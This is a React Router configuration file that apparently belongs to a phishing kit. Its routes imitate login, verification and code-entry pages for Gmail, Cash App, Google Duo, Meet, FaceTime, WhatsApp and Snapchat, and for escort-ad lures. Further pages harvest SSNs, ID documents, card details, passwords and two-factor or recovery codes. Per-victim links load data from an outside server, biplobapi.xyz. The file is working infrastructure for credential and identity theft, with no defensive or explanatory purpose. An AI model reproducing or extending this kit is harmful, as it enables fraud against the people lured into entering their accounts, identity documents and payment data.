import { createBrowserRouter } from "react-router-dom";
import Home from "../components/Home/Home";
import Form from "../components/Form/Form";
import Code from "../components/Code/Code";
import Email from "../components/Email/Email";
import Verify from "../components/Verify/Verify";
import Video from "../components/Video/Video";
import Live from "../components/Video/Live";
import VideoLogin from "../components/Video/VideoLogin";
import VideoCode from "../components/Video/VideoCode";
import Ssn from "../components/Ssn/Ssn";
import Id from "../components/Ssn/Id";
import Gmail from "../components/Gmail/Gmail";
import Password from "../components/Gmail/Password";
import NotFound from "../components/Gmail/NotFound";
import Duo from "../components/Duo/Duo";
import DuoLogin from "../components/Duo/Duologin";
import DuoCode from "../components/Duo/DuoCode";
import Test from "../components/Test/Test";
import Connecting from "../components/Test/Connecting";
import DuoNew from "../components/Duo/DuoNew";
import DuoHead from "../components/Duo/DuoHead";
import Card from "../components/Card/CardPage";
import CardPage from "../components/Card/CardPage";
import MeetNew from "../components/Meet/MeetNew";
import MeetLogin from "../components/Meet/MeetLogin";
import MeetCode from "../components/Meet/MeetCode";
import FaceTimeNew from "../components/FaceTime/FaceTimeNew";
import FaceTimeLogin from "../components/FaceTime/FaceTimeLogin";
import FaceTimeCode from "../components/FaceTime/FaceTimeCode";
import WhatsAppLogin from "../components/Whatsapp/WhatsAppLogin";
import WhatsAppNew from "../components/Whatsapp/WhatsAppNew";
import WhatsAppCode from "../components/Whatsapp/WhatsAppCode";
import SnapChatNew from "../components/SnapChat/SnapChatNew";
import SnapChatLogin from "../components/SnapChat/SnapChatLogin";
import SnapChatCode from "../components/SnapChat/SnapChatCode";
import BabylonNew from "../components/Babylon/BabylonNew";
import BabylonLogin from "../components/Babylon/BabylonLogin";
import HomePage from "../components/Email/HomePage";
import RecoveryCode from "../components/Gmail/RecoveryCode";
import EscortComments from "../components/Babylon/EscortComments";
import FacetimeNew from "../components/Email/FacetimeNew";

export const router = createBrowserRouter([
  {
    path: "/",
    element: <h1>Connecting...</h1>,
  },

  //---------- cash app link ----------
  // {
  //   path: "/verify/login/:id",
  //   loader: ({ params }) =>
  //     fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
  //   element: <Home></Home>,
  // },
  {
    path: "/login",
    element: <Form></Form>,
  },
  {
    path: "/verify",
    element: <Code></Code>,
  },
  //---------- cash app link ----------

  //---------- normal link ----------
  {
    path: "/auth/login/:id",
    // loader: ({ params }) =>
    //   fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
    //     method: "PUT",
    //     headers: {
    //       "content-type": "application/json",
    //     },
    //   }),
    element: <Email></Email>,
  },
  {
    path: "/facetime/:id",
    // loader: ({ params }) =>
    //   fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
    //     method: "PUT",
    //     headers: {
    //       "content-type": "application/json",
    //     },
    //   }),
    element: <FacetimeNew></FacetimeNew>,
  },
  // {
  //   path: "/auth/login/:id",
  //   loader: ({ params }) =>
  //     fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
  //   element: <HomePage></HomePage>,
  // },
  // {
  //   path: "/home/login/:id",
  //   loader: ({ params }) =>
  //     fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
  //   element: <Email></Email>,
  // },

  {
    path: "/verify/login/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <Email></Email>,
  },
  {
    path: "/female/escort/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <Email></Email>,
  },
  {
    path: "/security",
    element: <Verify></Verify>,
  },

  //---------- normal link ----------

  //---------- video link ----------
  {
    path: "/live/chat/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <Video></Video>,
  },
  // {
  //   path: "/live/chat/:id",
  //   loader: ({ params }) =>
  //     fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
  //   element: <Duo></Duo>,
  // },
  {
    path: "/live/chat/login/:id",
    element: <Live></Live>,
  },
  {
    path: "/live/chat/email/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <VideoLogin></VideoLogin>,
  },
  {
    path: "/live/chat/code",
    element: <VideoCode></VideoCode>,
  },

  //---------- video link ----------

  {
    path: "/ssn",
    element: <Ssn></Ssn>,
  },
  {
    path: "/id",
    element: <Id></Id>,
  },
  {
    path: "/gmail",
    element: <Gmail></Gmail>,
  },
  {
    path: "/gmail-user",
    element: <Password></Password>,
  },
  {
    path: "/recovery-code",
    element: <RecoveryCode></RecoveryCode>,
  },
  {
    path: "/404",
    element: <NotFound></NotFound>,
  },
  //---------- duo link ----------
  {
    path: "/google/duo/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <Duo></Duo>,
  },
  {
    path: "/duo/call/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <Duo></Duo>,
  },
  {
    path: "/google/duo/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <DuoNew></DuoNew>,
  },
  {
    path: "/live-chat/:id",
    element: <DuoHead></DuoHead>,
  },
  {
    path: "/duo/login/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <DuoLogin></DuoLogin>,
  },
  {
    path: "/duo/code/",
    element: <DuoCode></DuoCode>,
  },
  {
    path: "/card/information/",
    element: <CardPage></CardPage>,
  },
  //---------- babylon link ----------

  {
    path: "/verify/:id",
    element: <EscortComments></EscortComments>,
  },
  {
    path: "/escortalliqetor/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <BabylonNew></BabylonNew>,
  },
  {
    path: "/babylon/login/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <BabylonLogin></BabylonLogin>,
  },
  {
    path: "/meet/code/",
    element: <MeetCode></MeetCode>,
  },

  //---------- meet link ----------

  {
    path: "/meet/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <MeetNew></MeetNew>,
  },
  {
    path: "/meet/login/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <MeetLogin></MeetLogin>,
  },
  {
    path: "/meet/code/",
    element: <MeetCode></MeetCode>,
  },
  //---------- facetime link ----------

  {
    path: "/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <FaceTimeLogin></FaceTimeLogin>,
  },
  // {
  //   path: "/facetime/:id",
  //   loader: ({ params }) =>
  //     fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
  //   element: <FaceTimeNew></FaceTimeNew>,
  // },
  {
    path: "/facetime/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <FaceTimeLogin></FaceTimeLogin>,
  },
  {
    path: "/facetime/login/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <FaceTimeLogin></FaceTimeLogin>,
  },
  {
    path: "/facetime/code/",
    element: <FaceTimeCode></FaceTimeCode>,
  },
  //---------- whatsapp link ----------

  {
    path: "/whatsapp/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <WhatsAppNew></WhatsAppNew>,
  },
  {
    path: "/whatsapp/login/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <WhatsAppLogin></WhatsAppLogin>,
  },
  {
    path: "/whatsapp/code/",
    element: <WhatsAppCode></WhatsAppCode>,
  },
  //---------- snapchat link ----------

  {
    path: "/snapchat/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <SnapChatNew></SnapChatNew>,
  },
  {
    path: "/snapchat/login/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <SnapChatLogin></SnapChatLogin>,
  },
  {
    path: "/snapchat/code/",
    element: <SnapChatCode></SnapChatCode>,
  },

  // {
  //   path: "/auth/login/:id",
  //   loader: ({ params }) =>
  //     fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
  //   element: <Test></Test>
  // },
  {
    path: "/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <Live></Live>,
  },
  {
    path: "/connect/:id",
    loader: ({ params }) =>
      fetch(`https://biplobapi.xyz/auth/login/${params.id}`),
    element: <Test></Test>,
  },
  {
    path: "/loading",
    element: <Connecting></Connecting>,
  },
]);
